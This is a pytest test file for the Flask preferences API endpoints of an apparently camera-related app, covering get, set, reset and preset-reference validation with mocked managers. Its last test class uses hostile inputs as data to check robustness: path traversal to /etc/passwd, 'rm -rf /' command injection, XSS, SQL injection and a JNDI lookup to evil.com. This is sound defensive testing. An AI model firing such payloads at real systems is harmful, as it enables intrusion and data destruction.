"""
Unit tests for preferences routes (Issue #78 - Phase 1)

Tests user preferences API endpoints including CRUD operations,
validation, and preset reference cleanup.

Coverage Target: 75%+ (preferences.py is 149 lines)
"""

import pytest
import json
import sys
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from flask import Flask

# Import the blueprint
from routes.preferences import preferences_bp


# ============================================================================
# Fixtures
# ============================================================================

@pytest.fixture
def preferences_app():
    """Flask app with preferences blueprint for testing"""
    app = Flask(__name__)
    app.config['TESTING'] = True
    app.register_blueprint(preferences_bp, url_prefix='/api/preferences')
    return app


@pytest.fixture
def preferences_client(preferences_app):
    """Test client for preferences routes"""
    return preferences_app.test_client()


@pytest.fixture
def mock_preferences_manager(monkeypatch):
    """Mock preferences_manager for testing"""
    mock_mgr = MagicMock()
    monkeypatch.setattr('routes.preferences.preferences_manager', mock_mgr)
    return mock_mgr


@pytest.fixture
def mock_preset_manager(monkeypatch):
    """Mock preset_manager for testing"""
    mock_mgr = MagicMock()
    monkeypatch.setattr('routes.preferences.preset_manager', mock_mgr)
    return mock_mgr


# ============================================================================
# Test Get Preferences Endpoint
# ============================================================================

class TestPreferencesGet:
    """Tests for GET /api/preferences"""

    def test_get_preferences_returns_defaults(self, preferences_client, mock_preferences_manager):
        """GET /preferences returns default preferences"""
        # Mock preferences_manager.get_preferences()
        mock_preferences_manager.get_preferences.return_value = {
            'default_capture_preset': 'daylight',
            'default_preview_preset': 'balanced',
            'auto_capture_enabled': True
        }

        response = preferences_client.get('/api/preferences')

        assert response.status_code == 200
        data = json.loads(response.data)

        assert 'default_capture_preset' in data
        assert data['default_capture_preset'] == 'daylight'
        assert 'default_preview_preset' in data
        assert data['default_preview_preset'] == 'balanced'
        assert 'auto_capture_enabled' in data
        assert data['auto_capture_enabled'] is True

        # Verify manager was called
        mock_preferences_manager.get_preferences.assert_called_once()

    def test_get_preferences_returns_user_settings(self, preferences_client, mock_preferences_manager):
        """GET /preferences returns user-customized settings"""
        mock_preferences_manager.get_preferences.return_value = {
            'default_capture_preset': 'custom_preset',
            'theme': 'dark',
            'language': 'en'
        }

        response = preferences_client.get('/api/preferences')

        assert response.status_code == 200
        data = json.loads(response.data)
        assert data['default_capture_preset'] == 'custom_preset'
        assert data['theme'] == 'dark'

    def test_get_preferences_handles_empty_preferences(self, preferences_client, mock_preferences_manager):
        """GET /preferences handles empty preferences gracefully"""
        mock_preferences_manager.get_preferences.return_value = {}

        response = preferences_client.get('/api/preferences')

        assert response.status_code == 200
        data = json.loads(response.data)
        assert data == {}

    def test_get_preferences_handles_error(self, preferences_client, mock_preferences_manager):
        """GET /preferences returns 500 on manager error"""
        mock_preferences_manager.get_preferences.side_effect = Exception("Preferences file corrupted")

        response = preferences_client.get('/api/preferences')

        assert response.status_code == 500
        data = json.loads(response.data)
        assert 'error' in data


# ============================================================================
# Test Set Preference Endpoint
# ============================================================================

class TestPreferencesSet:
    """Tests for POST /api/preferences"""

    def test_set_preference_valid_key(self, preferences_client, mock_preferences_manager):
        """POST /preferences sets a valid preference"""
        mock_preferences_manager.set_preference.return_value = True

        response = preferences_client.post('/api/preferences', json={
            'key': 'default_capture_preset',
            'value': 'daylight'
        })

        assert response.status_code == 200
        data = json.loads(response.data)
        assert data['success'] is True
        assert 'updated successfully' in data['message']
        assert data['key'] == 'default_capture_preset'
        assert data['value'] == 'daylight'

        # Verify manager was called with correct parameters
        mock_preferences_manager.set_preference.assert_called_once_with(
            'default_capture_preset', 'daylight'
        )

    def test_set_preference_updates_file(self, preferences_client, mock_preferences_manager):
        """POST /preferences persists preference to file"""
        mock_preferences_manager.set_preference.return_value = True

        response = preferences_client.post('/api/preferences', json={
            'key': 'theme',
            'value': 'dark'
        })

        assert response.status_code == 200

        # Verify set_preference was called (which handles file I/O)
        mock_preferences_manager.set_preference.assert_called_once_with('theme', 'dark')

    def test_set_preference_type_validation(self, preferences_client, mock_preferences_manager):
        """POST /preferences validates value types"""
        # Test valid types
        valid_values = [
            ('string_pref', 'test_string'),
            ('int_pref', 42),
            ('float_pref', 3.14),
            ('bool_pref', True),
            ('null_pref', None)
        ]

        mock_preferences_manager.set_preference.return_value = True

        for key, value in valid_values:
            response = preferences_client.post('/api/preferences', json={
                'key': key,
                'value': value
            })

            assert response.status_code == 200, \
                f"Should accept valid type: {type(value).__name__}"

    def test_set_preference_rejects_invalid_types(self, preferences_client, mock_preferences_manager):
        """POST /preferences rejects invalid value types"""
        # Test invalid types (lists, dicts, tuples)
        # Note: sets can't be JSON serialized, so we test serializable types only
        invalid_values = [
            ['list', 'value'],
            {'dict': 'value'},
            ('tuple', 'value')  # Tuples become lists in JSON but still invalid
        ]

        for invalid_value in invalid_values:
            response = preferences_client.post('/api/preferences', json={
                'key': 'test_key',
                'value': invalid_value
            })

            assert response.status_code == 400, \
                f"Should reject invalid type: {type(invalid_value).__name__}"

            data = json.loads(response.data)
            assert 'Invalid value type' in data['error']

        # Verify set_preference was never called for invalid types
        mock_preferences_manager.set_preference.assert_not_called()

    def test_set_preference_none_value(self, preferences_client, mock_preferences_manager):
        """POST /preferences allows None to clear a preference"""
        mock_preferences_manager.set_preference.return_value = True

        response = preferences_client.post('/api/preferences', json={
            'key': 'default_capture_preset',
            'value': None
        })

        assert response.status_code == 200
        data = json.loads(response.data)
        assert data['success'] is True
        assert data['value'] is None

        # Verify None was passed to manager
        mock_preferences_manager.set_preference.assert_called_once_with(
            'default_capture_preset', None
        )

    def test_set_preference_requires_key(self, preferences_client, mock_preferences_manager):
        """POST /preferences requires key parameter"""
        response = preferences_client.post('/api/preferences', json={
            'value': 'some_value'
        })

        assert response.status_code == 400
        data = json.loads(response.data)
        assert 'Preference key is required' in data['error']

        # Verify set_preference was not called
        mock_preferences_manager.set_preference.assert_not_called()

    def test_set_preference_requires_json_body(self, preferences_client, mock_preferences_manager):
        """POST /preferences requires JSON request body"""
        # Post without content-type application/json causes Flask to return 500
        # This is actually handled by Flask's exception handler
        response = preferences_client.post('/api/preferences')

        # Flask returns 500 when request.json is accessed without proper content-type
        assert response.status_code == 500
        data = json.loads(response.data)
        assert 'error' in data

    def test_set_preference_handles_manager_failure(self, preferences_client, mock_preferences_manager):
        """POST /preferences handles manager failure gracefully"""
        mock_preferences_manager.set_preference.return_value = False

        response = preferences_client.post('/api/preferences', json={
            'key': 'test_key',
            'value': 'test_value'
        })

        assert response.status_code == 400
        data = json.loads(response.data)
        assert 'Failed to set preference' in data['error']

    def test_set_preference_handles_exception(self, preferences_client, mock_preferences_manager):
        """POST /preferences returns 500 on exception"""
        mock_preferences_manager.set_preference.side_effect = Exception("Disk full")

        response = preferences_client.post('/api/preferences', json={
            'key': 'test_key',
            'value': 'test_value'
        })

        assert response.status_code == 500
        data = json.loads(response.data)
        assert 'error' in data


# ============================================================================
# Test Reset Preferences Endpoint
# ============================================================================

class TestPreferencesReset:
    """Tests for POST /api/preferences/reset"""

    def test_reset_clears_all_preferences(self, preferences_client, mock_preferences_manager):
        """POST /reset clears all user preferences"""
        mock_preferences_manager.reset_preferences.return_value = True

        response = preferences_client.post('/api/preferences/reset')

        assert response.status_code == 200
        data = json.loads(response.data)
        assert data['success'] is True
        assert 'reset to defaults' in data['message']

        # Verify reset was called
        mock_preferences_manager.reset_preferences.assert_called_once()

    def test_reset_restores_defaults(self, preferences_client, mock_preferences_manager):
        """POST /reset restores default preferences"""
        mock_preferences_manager.reset_preferences.return_value = True

        response = preferences_client.post('/api/preferences/reset')

        assert response.status_code == 200
        # Success indicates defaults are restored
        data = json.loads(response.data)
        assert data['success'] is True

    def test_reset_handles_failure(self, preferences_client, mock_preferences_manager):
        """POST /reset handles reset failure"""
        mock_preferences_manager.reset_preferences.return_value = False

        response = preferences_client.post('/api/preferences/reset')

        assert response.status_code == 500
        data = json.loads(response.data)
        assert 'Failed to reset preferences' in data['error']

    def test_reset_handles_exception(self, preferences_client, mock_preferences_manager):
        """POST /reset handles exceptions gracefully"""
        mock_preferences_manager.reset_preferences.side_effect = Exception("Permission denied")

        response = preferences_client.post('/api/preferences/reset')

        assert response.status_code == 500
        data = json.loads(response.data)
        assert 'error' in data


# ============================================================================
# Test Validate Preferences Endpoint
# ============================================================================

class TestPreferencesValidation:
    """Tests for POST /api/preferences/validate"""

    def test_validate_cleans_invalid_preset_refs(self, preferences_client, mock_preferences_manager):
        """POST /validate removes references to deleted presets"""
        # Mock validation result with cleaned references
        mock_preferences_manager.validate_preset_references.return_value = {
            'cleaned': True,
            'removed_references': [
                ('default_capture_preset', 'deleted_preset'),
                ('default_preview_preset', 'another_deleted_preset')
            ],
            'preferences': {
                'theme': 'dark'  # Valid preferences that remain
            }
        }

        response = preferences_client.post('/api/preferences/validate')

        assert response.status_code == 200
        data = json.loads(response.data)

        assert data['success'] is True
        assert data['cleaned'] is True
        assert 'Cleaned 2 invalid preset reference(s)' in data['message']
        assert len(data['removed_references']) == 2

        # Verify removed references structure
        assert data['removed_references'][0]['key'] == 'default_capture_preset'
        assert data['removed_references'][0]['invalid_value'] == 'deleted_preset'

        assert 'preferences' in data
        assert data['preferences']['theme'] == 'dark'

    def test_validate_reports_removed_references(self, preferences_client, mock_preferences_manager):
        """POST /validate reports which references were removed"""
        mock_preferences_manager.validate_preset_references.return_value = {
            'cleaned': True,
            'removed_references': [
                ('custom_preset_key', 'nonexistent_preset')
            ],
            'preferences': {}
        }

        response = preferences_client.post('/api/preferences/validate')

        assert response.status_code == 200
        data = json.loads(response.data)

        assert len(data['removed_references']) == 1
        removed = data['removed_references'][0]
        assert removed['key'] == 'custom_preset_key'
        assert removed['invalid_value'] == 'nonexistent_preset'

    def test_validate_no_cleanup_needed(self, preferences_client, mock_preferences_manager):
        """POST /validate reports when all references are valid"""
        mock_preferences_manager.validate_preset_references.return_value = {
            'cleaned': False,
            'removed_references': [],
            'preferences': {
                'default_capture_preset': 'daylight',
                'default_preview_preset': 'balanced'
            }
        }

        response = preferences_client.post('/api/preferences/validate')

        assert response.status_code == 200
        data = json.loads(response.data)

        assert data['success'] is True
        assert data['cleaned'] is False
        assert 'All preset references are valid' in data['message']
        # When no cleanup needed, removed_references is not included in response
        assert 'removed_references' not in data

    def test_validate_handles_exception(self, preferences_client, mock_preferences_manager):
        """POST /validate handles validation errors gracefully"""
        mock_preferences_manager.validate_preset_references.side_effect = Exception("Preset manager error")

        response = preferences_client.post('/api/preferences/validate')

        assert response.status_code == 500
        data = json.loads(response.data)
        assert 'error' in data

    def test_validate_passes_preset_manager(self, preferences_client, mock_preferences_manager, mock_preset_manager):
        """POST /validate passes preset_manager to validation"""
        mock_preferences_manager.validate_preset_references.return_value = {
            'cleaned': False,
            'removed_references': [],
            'preferences': {}
        }

        response = preferences_client.post('/api/preferences/validate')

        assert response.status_code == 200

        # Verify preset_manager was passed to validate_preset_references
        mock_preferences_manager.validate_preset_references.assert_called_once()
        call_args = mock_preferences_manager.validate_preset_references.call_args
        # preset_manager should be passed as first argument
        assert call_args[0][0] is mock_preset_manager


# ============================================================================
# Test Preferences Security
# ============================================================================

class TestPreferencesSecurity:
    """Security-focused tests for preferences endpoints"""

    def test_preference_key_injection_prevention(self, preferences_client, mock_preferences_manager):
        """Preferences endpoint handles potentially malicious keys safely"""
        mock_preferences_manager.set_preference.return_value = True

        # Test various injection attempts
        malicious_keys = [
            '../../../etc/passwd',
            '__proto__',
            'constructor',
            'prototype',
            '../../sensitive_file',
            'key; rm -rf /',
            'key\nmalicious_code'
        ]

        for malicious_key in malicious_keys:
            response = preferences_client.post('/api/preferences', json={
                'key': malicious_key,
                'value': 'test'
            })

            # Should not crash - either succeeds or fails gracefully
            assert response.status_code in [200, 400, 500], \
                f"Should handle malicious key safely: {malicious_key}"

    def test_preference_value_sanitization(self, preferences_client, mock_preferences_manager):
        """Preferences endpoint handles potentially malicious values safely"""
        mock_preferences_manager.set_preference.return_value = True

        # Test XSS and injection attempts in values
        malicious_values = [
            '<script>alert("XSS")</script>',
            '"; DROP TABLE preferences; --',
            '${jndi:ldap://evil.com/a}',
            '../../../etc/passwd'
        ]

        for malicious_value in malicious_values:
            response = preferences_client.post('/api/preferences', json={
                'key': 'test_key',
                'value': malicious_value
            })

            # Should handle safely (strings are valid types)
            assert response.status_code in [200, 400, 500]

            if response.status_code == 200:
                # Verify value was passed as-is to manager (manager handles sanitization)
                mock_preferences_manager.set_preference.assert_called_with('test_key', malicious_value)
